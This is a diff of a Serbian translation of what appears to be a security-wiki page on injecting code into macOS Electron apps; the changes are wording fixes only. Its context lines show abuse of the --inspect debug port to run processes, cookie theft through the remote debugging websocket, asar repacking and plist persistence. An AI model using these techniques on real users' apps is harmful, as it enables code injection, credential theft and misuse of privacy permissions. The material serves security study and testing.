@@ -39,7 +39,7 @@ LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
 ### Modifikovanje Electron Fuzija
 
-Kao što [**dokumentacija pominje**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracija **Electron Fuzija** se podešava unutar **Electron binarnog** fajla koji sadrži negde string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
+Kao što [**dokumentacija pominje**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracija **Electron Fuzija** je podešena unutar **Electron binarnog** fajla koji sadrži negde string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
 
 U macOS aplikacijama ovo je obično u `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
 ```bash
@@ -70,7 +70,7 @@ Možete raspakovati kod iz asar fajla sa:
 ```bash
 npx asar extract app.asar app-decomp
 ```
-I da ga ponovo spakujete nakon što ga izmenite sa:
+I ponovo ga spakujte nakon što ste ga izmenili sa:
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
@@ -147,7 +147,7 @@ Možete zloupotrebiti ovu env varijablu u plist-u da održite postojanost dodava
 ```
 ## RCE sa inspekcijom
 
-Prema [**ovome**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ako izvršite Electron aplikaciju sa flagovima kao što su **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, **debug port će biti otvoren** tako da se možete povezati na njega (na primer iz Chrome-a u `chrome://inspect`) i moći ćete da **injektujete kod na njega** ili čak pokrenete nove procese.\
+Prema [**ovome**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ako izvršite Electron aplikaciju sa flagovima kao što su **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, **debug port će biti otvoren** tako da se možete povezati na njega (na primer iz Chrome-a u `chrome://inspect`) i moći ćete da **ubacite kod u njega** ili čak pokrenete nove procese.\
 Na primer:
 ```bash
 /Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
@@ -157,7 +157,7 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 > [!CAUTION]
 > Ako je osigurač **`EnableNodeCliInspectArguments`** onemogućen, aplikacija će **zanemariti node parametre** (kao što je `--inspect`) prilikom pokretanja osim ako nije postavljena env varijabla **`ELECTRON_RUN_AS_NODE`**, koja će takođe biti **zanemarena** ako je osigurač **`RunAsNode`** onemogućen.
 >
-> Međutim, još uvek možete koristiti **electron param `--remote-debugging-port=9229`** ali prethodni payload neće raditi za izvršavanje drugih procesa.
+> Međutim, još uvek možete koristiti **electron parametar `--remote-debugging-port=9229`** ali prethodni payload neće raditi za izvršavanje drugih procesa.
 
 Korišćenjem parametra **`--remote-debugging-port=9222`** moguće je ukrasti neke informacije iz Electron aplikacije kao što su **istorija** (sa GET komandama) ili **kolačići** pretraživača (pošto su **dekriptovani** unutar pretraživača i postoji **json endpoint** koji će ih dati).
 
@@ -169,11 +169,11 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
-U [**ovom blogu**](https://hackerone.com/reports/1274695), ovo debagovanje se zloupotrebljava da se headless chrome **preuzme proizvoljne datoteke na proizvoljne lokacije**.
+U [**ovoj blog objavi**](https://hackerone.com/reports/1274695), ovo debagovanje se zloupotrebljava da se headless chrome **preuzme proizvoljne datoteke na proizvoljnim lokacijama**.
 
 ### Injekcija iz App Plist
 
-Možete zloupotrebiti ovu env promenljivu u plist-u da održite postojanost dodajući ove ključeve:
+Možete zloupotrebiti ovu env varijablu u plist-u da održite postojanost dodavanjem ovih ključeva:
 ```xml
 <dict>
 <key>ProgramArguments</key>
@@ -199,7 +199,7 @@ Stoga, ako želite da zloupotrebite prava za pristup kameri ili mikrofonu, na pr
 
 ## Automatic Injection
 
-Alat [**electroniz3r**](https://github.com/r3ggi/electroniz3r) se može lako koristiti za **pronalazak ranjivih Electron aplikacija** koje su instalirane i injektovanje koda u njih. Ovaj alat će pokušati da koristi tehniku **`--inspect`**:
+Alat [**electroniz3r**](https://github.com/r3ggi/electroniz3r) se može lako koristiti za **pronalazak ranjivih Electron aplikacija** koje su instalirane i injektovanje koda u njih. Ovaj alat će pokušati da koristi **`--inspect`** tehniku:
 
 Morate ga sami kompajlirati i možete ga koristiti ovako:
 ```bash
